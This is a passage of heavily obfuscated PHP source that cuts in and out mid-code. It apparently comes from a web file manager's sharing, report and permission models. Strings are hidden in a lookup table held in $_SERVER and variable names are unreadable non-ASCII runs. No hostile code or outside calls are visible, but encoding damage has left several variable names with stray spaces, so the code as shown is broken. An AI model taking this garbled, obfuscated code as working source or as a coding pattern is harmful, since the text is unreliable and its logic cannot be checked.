Model($Ê‘ÃÀïÙ[570])->eventShare($¡¿ùÅ“„, $Ê‘ÃÀïÙ[2006]); } return; } $‘È¤´ï± = $this->getInfoByPath($¡¿ùÅ“„); $Á¥›×† = $Ê‘ÃÀïÙ[2007]; if ($‘È¤´ï±[$Ê‘ÃÀïÙ[494]] == $Ê‘ÃÀïÙ[197] && $îĞ†¶‚[$Ê‘ÃÀïÙ[494]] == $Ê‘ÃÀïÙ[88]) { $Á¥›×† = $Ê‘ÃÀïÙ[2005]; } if ($‘È¤´ï±[$Ê‘ÃÀïÙ[494]] == $Ê‘ÃÀïÙ[88] && $îĞ†¶‚[$Ê‘ÃÀïÙ[494]] == $Ê‘ÃÀïÙ[197]) { $Á¥›×† = $Ê‘ÃÀïÙ[2008]; } if ($‘È¤´ï±[$Ê‘ÃÀïÙ[496]] == $Ê‘ÃÀïÙ[197] && $îĞ†¶‚[$Ê‘ÃÀïÙ[496]] == $Ê‘ÃÀïÙ[88]) { $Á¥›×† = $Ê‘ÃÀïÙ[2006]; } if ($‘È¤´ï±[$Ê‘ÃÀïÙ[496]] == $Ê‘ÃÀïÙ[88] && $îĞ†¶‚[$Ê‘ÃÀïÙ[496]] == $Ê‘ÃÀïÙ[197]) { $Á¥›×† = $Ê‘ÃÀïÙ[2009]; } Model($Ê‘ÃÀïÙ[570])->eventShare($¡¿ùÅ“„, $Á¥›×†); return; } private function _addShareData($Éàªà…­, $’ÅÏÛ¯‘ = array(), $Õ†ÖáÖŞ = false) { $ÃÁäü‰Ï =& $_SERVER[ĞÂ¤àÓï]; $³«¸ø˜ = $Õ†ÖáÖŞ == $ÃÁäü‰Ï[1285] ? 0 : USER_ID; $É„¼ç¡è = array($ÃÁäü‰Ï[417] => $Éàªà…­, $ÃÁäü‰Ï[1655] => $³«¸ø˜); if ($Éàªà…­ == 0) { $É„¼ç¡è = array($ÃÁäü‰Ï[2010] => $’ÅÏÛ¯‘[$ÃÁäü‰Ï[1176]], $ÃÁäü‰Ï[1655] => $³«¸ø˜); } if ($ßÑø÷ñŸ = $this->where($É„¼ç¡è)->find()) { return $ßÑø÷ñŸ[$ÃÁäü‰Ï[489]]; } if ($Éàªà…­ == 0) { $‹¡ÏÈ† = array($ÃÁäü‰Ï[32] => get_path_this($’ÅÏÛ¯‘[$ÃÁäü‰Ï[84]])); } else { $‹¡ÏÈ† = Model($ÃÁäü‰Ï[832])->sourceInfo($Éàªà…­); if (!$‹¡ÏÈ†) { return !1; } } if (!$’ÅÏÛ¯‘[$ÃÁäü‰Ï[1564]]) { $’ÅÏÛ¯‘[$ÃÁäü‰Ï[1564]] = $‹¡ÏÈ†[$ÃÁäü‰Ï[32]]; } $»šüæÀ = array($ÃÁäü‰Ï[1655] => $³«¸ø˜, $ÃÁäü‰Ï[417] => $Éàªà…­, $ÃÁäü‰Ï[1564] => $ÃÁäü‰Ï[12], $ÃÁäü‰Ï[494] => 0, $ÃÁäü‰Ï[496] => 0, $ÃÁäü‰Ï[1176] => $ÃÁäü‰Ï[12], $ÃÁäü‰Ï[307] => $ÃÁäü‰Ï[12], $ÃÁäü‰Ï[889] => $ÃÁäü‰Ï[12], $ÃÁäü‰Ï[2011] => 0, $ÃÁäü‰Ï[2012] => 0, $ÃÁäü‰Ï[497] => 0, $ÃÁäü‰Ï[498] => $ÃÁäü‰Ï[12], $ÃÁäü‰Ï[491] => $ÃÁäü‰Ï[12]); $ŞÚóÕàÍ = explode($ÃÁäü‰Ï[50], $ÃÁäü‰Ï[2013]); foreach ($ŞÚóÕàÍ as $ÎÏÌÔÔé) { if (!isset($’ÅÏÛ¯‘[$ÎÏÌÔÔé])) { continue; } $»šüæÀ[$ÎÏÌÔÔé] = $’ÅÏÛ¯‘[$ÎÏÌÔÔé]; } $÷¹¨¤™Ä = $this->add($»šüæÀ); $“´íòÏ¨ = array($ÃÁäü‰Ï[491] => short_id($÷¹¨¤™Ä)); $this->where(array($ÃÁäü‰Ï[488] => $÷¹¨¤™Ä))->save($“´íòÏ¨); return $÷¹¨¤™Ä; } private function _shareAuthSet($‚¹‰×‡‘, $ÖäÑ³ˆ½) { $ïİ“ñØ© =& $_SERVER[ĞÂ¤àÓï]; if (!is_array($ÖäÑ³ˆ½)) { return !1; } $Ò€ıÌû© = Model($ïİ“ñØ©[1962]); $Ò€ıÌû©->where(array($ïİ“ñØ©[489] => $‚¹‰×‡‘))->delete(); $ìí­Òöû = array(); foreach ($ÖäÑ³ˆ½ as $â¢Šè¸) { $§€Ù´â = SourceModel::TYPE_USER; if ($â¢Šè¸[$ïİ“ñØ©[411]] == SourceModel::TYPE_GROUP) { $§€Ù´â = SourceModel::TYPE_GROUP; } $ŠˆÎŠ®¨ = array($ïİ“ñØ©[489] => $‚¹‰×‡‘, $ïİ“ñØ©[411] => $§€Ù´â, $ïİ“ñØ©[505] => intval($â¢Šè¸[$ïİ“ñØ©[505]]), $ïİ“ñØ©[1958] => 0, $ïİ“ñØ©[2014] => -1); if ($â¢Šè¸[$ïİ“ñØ©[1958]]) { $ŠˆÎŠ®¨[$ïİ“ñØ©[1958]] = $â¢Šè¸[$ïİ“ñØ©[1958]]; } else { if ($â¢Šè¸[$ïİ“ñØ©[2014]]) { $ŠˆÎŠ®¨[$ïİ“ñØ©[2014]] = $â¢Šè¸[$ïİ“ñØ©[2014]]; } } $ìí­Òöû[] = $ŠˆÎŠ®¨; } return $Ò€ıÌû©->addAll($ìí­Òöû, array(), !0); } public function numViewAdd($«Â¼¦™Á) { $ûÂä¸¿ =& $_SERVER[ĞÂ¤àÓï]; $ öÇ¯æ = array($ûÂä¸¿[488] => $«Â¼¦™Á); $this->where($ öÇ¯æ)->setAdd($ûÂä¸¿[2011]); } public function numDownloadAdd($«£ëš»Ô) { $ÓèÎéôœ =& $_SERVER[ĞÂ¤àÓï]; $ÓÃùÕïÓ = array($ÓèÎéôœ[488] => $«£ëš»Ô); $this->where($ÓÃùÕïÓ)->setAdd($ÓèÎéôœ[2012]); } protected function shareEdit($˜„ñï…, $ÉÀ±Òß­) { $âßŞ×îô =& $_SERVER[ĞÂ¤àÓï]; $Òöİ ÊÇ = $this->getInfo($˜„ñï…); if (!$Òöİ ÊÇ) { return !1; } $this->_checkLinkShare($ÉÀ±Òß­, $Òöİ ÊÇ); $½äğñ» = array(); $ÉšÃ™ãö = explode($âßŞ×îô[50], $âßŞ×îô[2015]); foreach ($ÉšÃ™ãö as $™Œ«¬ı) { if (!array_key_exists($™Œ«¬ı, $ÉÀ±Òß­)) { continue; } $½äğñ»[$™Œ«¬ı] = $ÉÀ±Òß­[$™Œ«¬ı]; } $this->shareEventAdd($Òöİ ÊÇ[$âßŞ×îô[402]], $ÉÀ±Òß­, $âßŞ×îô[1824]); $this->where(array($âßŞ×îô[488] => $˜„ñï…))->save($½äğñ»); if (isset($ÉÀ±Òß­[$âßŞ×îô[2004]])) { $this->_shareAuthSet($˜„ñï…, $ÉÀ±Òß­[$âßŞ×îô[2004]]); } return !0; } private function _checkLinkShare($ĞÎ•êîô, $ËÙøÔ¤£) { $ª“˜ó =& $_SERVER[ĞÂ¤àÓï]; if ($ĞÎ•êîô[$ª“˜ó[494]] != $ª“˜ó[88]) { return; } $¢¾ª ±ç = $ËÙøÔ¤£[$ª“˜ó[86]][$ª“˜ó[402]]; if ($ËÙøÔ¤£[$ª“˜ó[86]][$ª“˜ó[33]] != $ª“˜ó[199]) { $Ë™‰´¥Ë = $this->_folderReport($¢¾ª ±ç); if (!$Ë™‰´¥Ë) { return; } show_json(LNG($ª“˜ó[2016]) . $ª“˜ó[2017] . $Ë™‰´¥Ë, !1); } $ú‹–Å¯Õ = Model($ª“˜ó[832])->fileInfoGet($ËÙøÔ¤£[$ª“˜ó[86]][$ª“˜ó[402]]); if (!$ú‹–Å¯Õ) { return; } $ëüÃÁë = $this->shareFileMeta($ú‹–Å¯Õ[$ª“˜ó[468]]); if (isset($ëüÃÁë[$ª“˜ó[374]]) && $ëüÃÁë[$ª“˜ó[374]] == $ª“˜ó[88]) { show_json(LNG($ª“˜ó[2018]), !1); } } private function _folderReport($É´‡ÃçÛ) { $³’â¤Ì =& $_SERVER[ĞÂ¤àÓï]; $É€ø’ùœ = array($³’â¤Ì[468] => array($³’â¤Ì[1012], 0), $³’â¤Ì[749] => 3); $µèéº–ù = Model($³’â¤Ì[2019])->where($É€ø’ùœ)->field($³’â¤Ì[468])->select(); if (!$µèéº–ù) { return !1; } $µèéº–ù = array_to_keyvalue($µèéº–ù, $³’â¤Ì[12], $³’â¤Ì[468]); $ÇÜ”¯Ç = $³’â¤Ì[50] . $É´‡ÃçÛ . $³’â¤Ì[50]; $É€ø’ùœ = array($³’â¤Ì[468] => array($³’â¤Ì[7], $µèéº–ù), $³’â¤Ì[521] => array($³’â¤Ì[383], "\x25{$ÇÜ”¯Ç}\45"), $³’â¤Ì[431] => 0); $¶®Èß İ = Model($³’â¤Ì[832])->where($É€ø’ùœ)->field($³’â¤Ì[2020])->find(); if (!$¶®Èß İ) { return !1; } $Æ¤®¼é¯ = substr($¶®Èß İ[$³’â¤Ì[521]], strpos($¶®Èß İ[$³’â¤Ì[521]], $ÇÜ”¯Ç)); $É€ø’ùœ = array($³’â¤Ì[402] => array($³’â¤Ì[7], trim($Æ¤®¼é¯, $³’â¤Ì[50]))); $Ø‡â–ã— = Model($³’â¤Ì[832])->where($É€ø’ùœ)->field($³’â¤Ì[32])->select(); $Ì—Š­ø = array_to_keyvalue($Ø‡â–ã—, $³’â¤Ì[12], $³’â¤Ì[32]); $Ì—Š­ø[] = $¶®Èß İ[$³’â¤Ì[32]]; return implode($³’â¤Ì[8], $Ì—Š­ø); } protected function remove($ÉéÜ÷ Õ) { $¶ëñÈßÃ =& $_SERVER[ĞÂ¤àÓï]; if (is_array($ÉéÜ÷ Õ)) { $ÉéÜ÷ Õ = array($¶ëñÈßÃ[7], $ÉéÜ÷ Õ); } $åÏûÅŞ = array($¶ëñÈßÃ[489] => $ÉéÜ÷ Õ); $ÆÈÍˆÚµ = $this->where($åÏûÅŞ)->delete(); if ($ÆÈÍˆÚµ) { Model($¶ëñÈßÃ[602])->where(array($¶ëñÈßÃ[489] => $ÉéÜ÷ Õ))->delete(); } $º¿¾¢¤Ò = is_array($ÉéÜ÷ Õ) ? $ÉéÜ÷ Õ[1] : array($ÉéÜ÷ Õ); for ($ú©ï‚¢ = 0; $ú©ï‚¢ < count($º¿¾¢¤Ò); $ú©ï‚¢++) { $ÙÉÏ‚ƒŠ = $this->getInfo($º¿¾¢¤Ò[$ú©ï‚¢]); if ($ÙÉÏ‚ƒŠ[$¶ëñÈßÃ[496]] == $¶ëñÈßÃ[88]) { Model($¶ëñÈßÃ[570])->eventShare($ÙÉÏ‚ƒŠ[$¶ëñÈßÃ[402]], $¶ëñÈßÃ[2009]); } if ($ÙÉÏ‚ƒŠ[$¶ëñÈßÃ[494]] == $¶ëñÈßÃ[88]) { Model($¶ëñÈßÃ[570])->eventShare($ÙÉÏ‚ƒŠ[$¶ëñÈßÃ[402]], $¶ëñÈßÃ[2008]); } } return $ÆÈÍˆÚµ; } protected function removeBySource($Æõ¹½Ğ©) { $ï§¼š =& $_SERVER[ĞÂ¤àÓï]; $ëı¤¿€Ö = array($ï§¼š[417] => array($ï§¼š[418], $Æõ¹½Ğ©)); $Ãç·—† = $this->field($ï§¼š[489])->where($ëı¤¿€Ö)->select(); $Ãç·—† = array_to_keyvalue($Ãç·—†, $ï§¼š[12], $ï§¼š[489]); if (!$Ãç·—†) { return; } $ëı¤¿€Ö = array($ï§¼š[488] => array($ï§¼š[418], $Ãç·—†)); $this->where($ëı¤¿€Ö)->delete(); Model($ï§¼š[602])->where($ëı¤¿€Ö)->delete(); } public function listAll($÷êèó×ì) { $›åÖ¶­® =& $_SERVER[ĞÂ¤àÓï]; $Ù½¹¿éÑ = array(); if ($÷êèó×ì[$›åÖ¶­®[1664]]) { $Ù½¹¿éÑ[$›åÖ¶­®[1664]] = $÷êèó×ì[$›åÖ¶­®[1664]]; } if ($÷êèó×ì[$›åÖ¶­®[760]]) { $«¸î”ª = $÷êèó×ì[$›åÖ¶­®[497]] ? $÷êèó×ì[$›åÖ¶­®[497]] : strtotime(date($›åÖ¶­®[2021])); $Ù½¹¿éÑ[$›åÖ¶­®[200]] = array($›åÖ¶­®[333], array($÷êèó×ì[$›åÖ¶­®[760]], $«¸î”ª)); } if ($÷êèó×ì[$›åÖ¶­®[33]]) { $Ù½¹¿éÑ[$÷êèó×ì[$›åÖ¶­®[33]]] = 1; } else { $Ù½¹¿éÑ[] = array($›åÖ¶­®[494] => array($›åÖ¶­®[1012], 0), $›åÖ¶­®[496] => array($›åÖ¶­®[1012], 0), $›åÖ¶­®[1998] => $›åÖ¶­®[1952]); } if ($÷êèó×ì[$›åÖ¶­®[1948]]) { $Ù½¹¿éÑ[] = array($›åÖ¶­®[491] => $÷êèó×ì[$›åÖ¶­®[1948]], $›åÖ¶­®[1564] => array($›åÖ¶­®[383], "\x25{$÷êèó×ì[$›åÖ¶­®[1948]]}\x25"), $›åÖ¶­®[1998] => $›åÖ¶­®[1952]); } $·¡äºò´ = $this->_makeOrder()->where($Ù½¹¿éÑ)->selectPage(20); if (empty($·¡äºò´[$›åÖ¶­®[369]])) { return array(); } $this->_listDataApply($·¡äºò´[$›åÖ¶­®[369]]); return $·¡äºò´; } public function listDataApply($ÆÖÑÁƒ) { $this->_listDataApply($ÆÖÑÁƒ); return $ÆÖÑÁƒ; } private function _listDataApply(&$¥ÔĞˆ¬Œ) { $›®ë’× =& $_SERVER[ĞÂ¤àÓï]; $‚Æì÷¬Æ = array_to_keyvalue($¥ÔĞˆ¬Œ, $›®ë’×[12], $›®ë’×[1664]); $£ÚŸ†ı– = Model($›®ë’×[535])->userListInfo(array_unique($‚Æì÷¬Æ)); $•ã¨ñÒÈ = array_to_keyvalue($¥ÔĞˆ¬Œ, $›®ë’×[12], $›®ë’×[402]); $„¦“¶º± = Model($›®ë’×[832])->sourceListInfo($•ã¨ñÒÈ, !0); foreach ($¥ÔĞˆ¬Œ as $¦ÈÊñÌ» => &$½ÃŒÔ¶Ú) { $ú˜„³•Û = $½ÃŒÔ¶Ú[$›®ë’×[1664]]; $½ÃŒÔ¶Ú[$›®ë’×[2022]] = $£ÚŸ†ı–[$ú˜„³•Û] ? $£ÚŸ†ı–[$ú˜„³•Û] : !1; $ãµÊ = $½ÃŒÔ¶Ú[$›®ë’×[402]]; $½ÃŒÔ¶Ú[$›®ë’×[86]] = $„¦“¶º±[$ãµÊ] ? $„¦“¶º±[$ãµÊ] : !1; if ($½ÃŒÔ¶Ú[$›®ë’×[86]][$›®ë’×[431]] == $›®ë’×[88]) { unset($¥ÔĞˆ¬Œ[$¦ÈÊñÌ»]); } if ($½ÃŒÔ¶Ú[$›®ë’×[86]] != $›®ë’×[197] && !$½ÃŒÔ¶Ú[$›®ë’×[86]]) { unset($¥ÔĞˆ¬Œ[$¦ÈÊñÌ»]); } } unset($½ÃŒÔ¶Ú); $¥ÔĞˆ¬Œ = array_values($¥ÔĞˆ¬Œ); } private function _makeOrder($ööšûå = '') { $İÓ×¶Ñ =& $_SERVER[ĞÂ¤àÓï]; $ÑœÎ¨íæ = array($İÓ×¶Ñ[200], $İÓ×¶Ñ[497], $İÓ×¶Ñ[2011], $İÓ×¶Ñ[2012]); $º‘ğØ¦Ø = array($İÓ×¶Ñ[450] => $İÓ×¶Ñ[451], $İÓ×¶Ñ[452] => $İÓ×¶Ñ[453]); $¸Å®£«Ë = Input::get($İÓ×¶Ñ[457], $İÓ×¶Ñ[7], $İÓ×¶Ñ[423], $ÑœÎ¨íæ); $¬‹ğ€ö = Input::get($İÓ×¶Ñ[458], $İÓ×¶Ñ[7], $İÓ×¶Ñ[2023], array($İÓ×¶Ñ[1945], $İÓ×¶Ñ[452])); $¬‹ğ€ö = $º‘ğØ¦Ø[$¬‹ğ€ö]; $ööšûå = $ööšûå . "{$¸Å®£«Ë}\40{$¬‹ğ€ö}"; return $this->order($ööšûå); } public function reportAdd($ÎÛİŒÛ’) { $óî™²æ† =& $_SERVER[ĞÂ¤àÓï]; $¦Ñ´ˆÖ¤ = array($óî™²æ†[489] => $ÎÛİŒÛ’[$óî™²æ†[489]], $óî™²æ†[1664] => USER_ID); if (Model($óî™²æ†[2019])->where($¦Ñ´ˆÖ¤)->find()) { return !1; } $Ú‹¨Ø«Ó = array($óî™²æ†[489] => $ÎÛİŒÛ’[$óî™²æ†[489]], $óî™²æ†[1564] => $ÎÛİŒÛ’[$óî™²æ†[1564]], $óî™²æ†[402] => $ÎÛİŒÛ’[$óî™²æ†[402]], $óî™²æ†[468] => $ÎÛİŒÛ’[$óî™²æ†[468]], $óî™²æ†[1664] => USER_ID, $óî™²æ†[33] => $ÎÛİŒÛ’[$óî™²æ†[33]], $óî™²æ†[453] => $ÎÛİŒÛ’[$óî™²æ†[453]]); return Model($óî™²æ†[2019])->add($Ú‹¨Ø«Ó); } public function reportList($âØïÏÃ) { $ëøùæÅ =& $_SERVER[ĞÂ¤àÓï]; $ç§ ßÃ— = array(); if ($âØïÏÃ[$ëøùæÅ[760]]) { $öËÉøÉ‹ = $âØïÏÃ[$ëøùæÅ[497]] ? $âØïÏÃ[$ëøùæÅ[497]] : strtotime(date($ëøùæÅ[2021])); $ç§ ßÃ—[$ëøùæÅ[200]] = array($ëøùæÅ[333], array($âØïÏÃ[$ëøùæÅ[760]], $öËÉøÉ‹)); } if (isset($âØïÏÃ[$ëøùæÅ[33]]) && in_array($âØïÏÃ[$ëøùæÅ[33]], array($ëøùæÅ[88], $ëøùæÅ[437], $ëøùæÅ[2024], $ëøùæÅ[2025], $ëøùæÅ[2026]))) { $ç§ ßÃ—[$ëøùæÅ[33]] = $âØïÏÃ[$ëøùæÅ[33]]; } if (isset($âØïÏÃ[$ëøùæÅ[749]]) && in_array($âØïÏÃ[$ëøùæÅ[749]], array($ëøùæÅ[197], $ëøùæÅ[88], $ëøùæÅ[437], $ëøùæÅ[2024]))) { $ç§ ßÃ—[$ëøùæÅ[749]] = $âØïÏÃ[$ëøùæÅ[749]]; } $Â’Ãš×ö = Input::get($ëøùæÅ[458], $ëøùæÅ[7], $ëøùæÅ[2023], array($ëøùæÅ[1945], $ëøùæÅ[452])); $ªÊ›¹‚Ş = array($ëøùæÅ[450] => $ëøùæÅ[451], $ëøùæÅ[452] => $ëøùæÅ[453]); $í¥ÂµùÑ = $ëøùæÅ[2027] . $ªÊ›¹‚Ş[$Â’Ãš×ö]; $µ¦Äƒ = Model($ëøùæÅ[2019])->where($ç§ ßÃ—)->order($í¥ÂµùÑ)->selectPage(20); if (empty($µ¦Äƒ[$ëøùæÅ[369]])) { return array(); } $—Ò¯æ·­ = array_to_keyvalue_group($µ¦Äƒ[$ëøùæÅ[369]], $ëøùæÅ[749], $ëøùæÅ[489]); if (!empty($—Ò¯æ·­[0])) { $âØïÏÃ = $—Ò¯æ·­[0]; $ç§ ßÃ— = array($ëøùæÅ[489] => array($ëøùæÅ[7], $âØïÏÃ)); $Úîœ¦Ç½ = $this->where($ç§ ßÃ—)->field($ëøùæÅ[489])->select(); $Úîœ¦Ç½ = array_to_keyvalue($Úîœ¦Ç½, $ëøùæÅ[12], $ëøùæÅ[489]); $Üô˜ŠŞ” = array_diff($âØïÏÃ, $Úîœ¦Ç½); if (!empty($Üô˜ŠŞ”)) { foreach ($µ¦Äƒ[$ëøùæÅ[369]] as $Á¥ØÊ => $Šïµ¿ß) { if (in_array($Šïµ¿ß[$ëøùæÅ[489]], $Üô˜ŠŞ”)) { unset($µ¦Äƒ[$ëøùæÅ[369]][$Á¥ØÊ]); } } } } $this->_listDataApply($µ¦Äƒ[$ëøùæÅ[369]]); return $µ¦Äƒ; } public function reportStatus($Ú¢¿“—†) { $äö¸µ =& $_SERVER[ĞÂ¤àÓï]; $âÂø­ÈÆ = array($äö¸µ[399] => $Ú¢¿“—†[$äö¸µ[399]]); $À´ãÊ›œ = Model($äö¸µ[2019])->where($âÂø­ÈÆ)->field($äö¸µ[2028])->find(); if (!$À´ãÊ›œ) { return !1; } $ù‘é€„è = array($äö¸µ[749] => $Ú¢¿“—†[$äö¸µ[749]]); if ($Ú¢¿“—†[$äö¸µ[749]] == $äö¸µ[2024] && $À´ãÊ›œ[$äö¸µ[749]] == $äö¸µ[2024]) { $ù‘é€„è[$äö¸µ[749]] = 0; } $Û£†Ôá÷ = Model($äö¸µ[2019])->where($âÂø­ÈÆ)->save($ù‘é€„è); if ($Ú¢¿“—†[$äö¸µ[749]] == $äö¸µ[437]) { if ($À´ãÊ›œ[$äö¸µ[468]] != $äö¸µ[197] && $this->shareFileMeta($À´ãÊ›œ[$äö¸µ[468]])) { $this->shareFileMeta($À´ãÊ›œ[$äö¸µ[468]], 0); } $this->remove($À´ãÊ›œ[$äö¸µ[489]]); return !0; } if ($Û£†Ôá÷ && $Ú¢¿“—†[$äö¸µ[749]] == $äö¸µ[2024]) { $ÈíÔ¢¿Æ = $ù‘é€„è[$äö¸µ[749]] == $äö¸µ[2024] ? 1 : 0; $this->shareFileMeta($À´ãÊ›œ[$äö¸µ[468]], $ÈíÔ¢¿Æ); $this->removeByFile($À´ãÊ›œ[$äö¸µ[468]]); } return $Û£†Ôá÷; } private function removeByFile($úüçß‘) { $¨ì•³åÒ =& $_SERVER[ĞÂ¤àÓï]; $ƒÂûì°Ô = Model($¨ì•³åÒ[832])->where(array($¨ì•³åÒ[468] => $úüçß‘))->field($¨ì•³åÒ[402])->select(); $”Ì¥´¹¹ = array_to_keyvalue($ƒÂûì°Ô, $¨ì•³åÒ[12], $¨ì•³åÒ[402]); $™Ûö¤­¦ = array($¨ì•³åÒ[402] => array($¨ì•³åÒ[7], $”Ì¥´¹¹), $¨ì•³åÒ[494] => 1); $ƒÂûì°Ô = $this->where($™Ûö¤­¦)->field($¨ì•³åÒ[489])->select(); if (empty($ƒÂûì°Ô)) { return; } $ş»–Û©İ = array_to_keyvalue($ƒÂûì°Ô, $¨ì•³åÒ[12], $¨ì•³åÒ[489]); $this->remove($ş»–Û©İ); } private function shareFileMeta($œ¢¤¬ Á, $Ğ°Ö“€ï = null) { $ĞÃ¾ÊÆ• =& $_SERVER[ĞÂ¤àÓï]; $öğù“¾Ş = array($ĞÃ¾ÊÆ•[468] => $œ¢¤¬ Á, $ĞÃ¾ÊÆ•[94] => $ĞÃ¾ÊÆ•[2029]); if (is_null($Ğ°Ö“€ï)) { return Model($ĞÃ¾ÊÆ•[2030])->where($öğù“¾Ş)->find(); } $öğù“¾Ş[$ĞÃ¾ÊÆ•[374]] = $Ğ°Ö“€ï; Model($ĞÃ¾ÊÆ•[2030])->add($öğù“¾Ş, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\145\x5f\x61\165\x74\x68"; public function getAuth($éìÅ») { $­¶ÛÍ¬È =& $_SERVER[ĞÂ¤àÓï]; $‡ÂŠòÑû = $this->sourceAuthSelect($éìÅ»); $ÑÏÒ´Ëù = array(); $”¼øÚâò = array(); $ ™Ç½©£ = 2 << 25; foreach ($‡ÂŠòÑû as $–®ã…íò) { $õşÛçõ = Model($­¶ÛÍ¬È[507])->listData($–®ã…íò[$­¶ÛÍ¬È[1958]]); if (!$õşÛçõ) { continue; } $ÑÏÒ´Ëù[] = $–®ã…íò; $ïŞ÷Ï§ = 0; if ($–®ã…íò[$­¶ÛÍ¬È[411]] == SourceModel::TYPE_GROUP) { $ïŞ÷Ï§ = $ ™Ç½©£ * 2; } if ($–®ã…íò[$­¶ÛÍ¬È[411]] == SourceModel::TYPE_USER) { $ïŞ÷Ï§ = $ ™Ç½©£; } if ($–®ã…íò[$­¶ÛÍ¬È[411]] == SourceModel::TYPE_USER && $–®ã…íò[$­¶ÛÍ¬È[505]] == $­¶ÛÍ¬È[197]) { $ïŞ÷Ï§ = 0; } $”¼øÚâò[] = $õşÛçõ[$­¶ÛÍ¬È[413]] + $ïŞ÷Ï§; } array_multisort($”¼øÚâò, SORT_DESC, $ÑÏÒ´Ëù); return $ÑÏÒ´Ëù; } public function sourceAuthSelect($ˆÒÂÅ¤) { $®ŸéäñÆ =& $_SERVER[ĞÂ¤àÓï]; static $³‡°åÜ¶ = array(); $âÇú’¬„ = is_array($ˆÒÂÅ¤) ? !1 : !0; if ($âÇú’¬„) { $ˆÒÂÅ¤ = array($ˆÒÂÅ¤); } $‰éòäñ = array(); foreach ($ˆÒÂÅ¤ as $„³°–æ„) { if (isset($³‡°åÜ¶[$„³°–æ„])) { $‰éòäñ[$„³°–æ„] = $³‡°åÜ¶[$„³°–æ„]; } } if (count($‰éòäñ) == count($ˆÒÂÅ¤)) { return $âÇú’¬„ ? $‰éòäñ[$ˆÒÂÅ¤[0]] : $‰éòäñ; } $ÆÂ‘±—Š = $®ŸéäñÆ[2031]; $ÒÆ¯úì = array($®ŸéäñÆ[402] => array($®ŸéäñÆ[7], $ˆÒÂÅ¤)); $¬É¹™²Á = $this->field($ÆÂ‘±—Š)->order($®ŸéäñÆ[399])->where($ÒÆ¯úì)->select(); $ÖÓ˜Ô†¡ = array_to_keyvalue_group($¬É¹™²Á, $®ŸéäñÆ[402]); foreach ($ˆÒÂÅ¤ as $„³°–æ„) { $³‡°åÜ¶[$„³°–æ„] = $ÖÓ˜Ô†¡[$„³°–æ„] ? $ÖÓ˜Ô†¡[$„³°–æ„] : array(); } if ($âÇú’¬„) { return $¬É¹™²Á; } return $ÖÓ˜Ô†¡; } public function setAuth($¬‘ä, $÷¯óå¶ï) { $‚ãÇ§“ç =& $_SERVER[ĞÂ¤àÓï]; $§¶ÇêˆÑ = Model($‚ãÇ§“ç[1336])->sourceInfo($¬‘ä); if (!$§¶ÇêˆÑ) { return !1; } if ($§¶ÇêˆÑ[$‚ãÇ§“ç[411]] != SourceModel::TYPE_GROUP) { return !1; } $ùÊá÷ = 1; $ÊŠ¯Ø¹ = $§¶ÇêˆÑ[$‚ãÇ§“ç[505]]; if ($ÊŠ¯Ø¹ != $ùÊá÷) { $–ÅÀÔ¥ê = array($‚ãÇ§“ç[1854] => $ÊŠ¯Ø¹); $ÔÌÀÛ” = Model($‚ãÇ§“ç[1944])->field($‚ãÇ§“ç[1664])->where($–ÅÀÔ¥ê)->select(); $ÔÌÀÛ” = array_to_keyvalue($ÔÌÀÛ”, $‚ãÇ§“ç[12], $‚ãÇ§“ç[1664]); } $ ‡ĞÉµ£ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $åÁğŠË = array(); foreach ($÷¯óå¶ï as $û’¶«™Ú) { if (!in_array($û’¶«™Ú[$‚ãÇ§“ç[411]], $ ‡ĞÉµ£)) { show_json(LNG($‚ãÇ§“ç[2032]), !1); } if ($ÊŠ¯Ø¹ != $ùÊá÷) { if ($û’¶«™Ú[$‚ãÇ§“ç[411]] == SourceModel::TYPE_GROUP) { } if ($û’¶«™Ú[$‚ãÇ§“ç[505]] != 0 && !in_array($û’¶«™Ú[$‚ãÇ§“ç[505]], $ÔÌÀÛ”)) { } } if ($û’¶«™Ú[$‚ãÇ§“ç[505]] == 0) { $û’¶«™Ú[$‚ãÇ§“ç[411]] = SourceModel::TYPE_USER; } $åÁğŠË[] = array($‚ãÇ§“ç[402] => $¬‘ä, $‚ãÇ§“ç[411] => intval($û’¶«™Ú[$‚ãÇ§“ç[411]]), $‚ãÇ§“ç[505] => intval($û’¶«™Ú[$‚ãÇ§“ç[505]]), $‚ãÇ§“ç[1958] => intval($û’¶«™Ú[$‚ãÇ§“ç[1958]]) ? intval($û’¶«™Ú[$‚ãÇ§“ç[1958]]) : 0, $‚ãÇ§“ç[2014] => intval($û’¶«™Ú[$‚ãÇ§“ç[2014]]) ? intval($û’¶«™Ú[$‚ãÇ§“ç[2014]]) : -1); } $this->where(array($‚ãÇ§“ç[417] => $¬‘ä))->delete(); $this->addAll($åÁğŠË); return !0; } public function authClear($¸æáªı) { $òçø›Ìû =& $_SERVER[ĞÂ¤àÓï]; $Öàã…©Û = Model($òçø›Ìû[1336])->sourceInfo($¸æáªı); $÷…¿‰’Á = array($¸æáªı); if ($Öàã…©Û[$òçø›Ìû[410]] == $òçø›Ìû[88]) { $±¼éô§ = array($òçø›Ìû[590] => array($òçø›Ìû[550], $Öàã…©Û[$òçø›Ìû[521]] . $¸æáªı . $òçø›Ìû[551])); $÷…¿‰’Á = Model($òçø›Ìû[1336])->field($òçø›Ìû[417])->where($±¼éô§)->getField($òçø›Ìû[402], !0); $÷…¿‰’Á[] = $¸æáªı; } $this->where(array($òçø›Ìû[417] => array($òçø›Ìû[418], $÷…¿‰’Á)))->delete(); return !0; } public function getAllChildren($¥Ö“ÊÆº) { $‘¢ÇÀ±’ =& $_SERVER[ĞÂ¤àÓï]; $‹îÆ™ëø = Model($‘¢ÇÀ±’[1336])->sourceInfo($¥Ö“ÊÆº); if ($‹îÆ™ëø[$‘¢ÇÀ±’[410]] != $‘¢ÇÀ±’[88]) { return $this->sourceListAuth(array($¥Ö“ÊÆº)); } if ($‹îÆ™ëø[$‘¢ÇÀ±’[411]] != SourceModel::TYPE_GROUP) { return array(); } $€’ÓÌÀƒ = 1; $¤öªÀ¢² = array($¥Ö“ÊÆº); if ($‹îÆ™ëø[$‘¢ÇÀ±’[432]] == $‘¢ÇÀ±’[197] && $‹îÆ™ëø[$‘¢ÇÀ±’[505]] != $€’ÓÌÀƒ) { $¤öªÀ¢² = $this->groupChidldAllRootSource($‹îÆ™ëø[$‘¢ÇÀ±’[505]]); } $ı€Ñìà = $this->field($‘¢ÇÀ±’[402])->group($‘¢ÇÀ±’[402])->select(); $ı€Ñìà = array_to_keyvalue($ı€Ñìà, 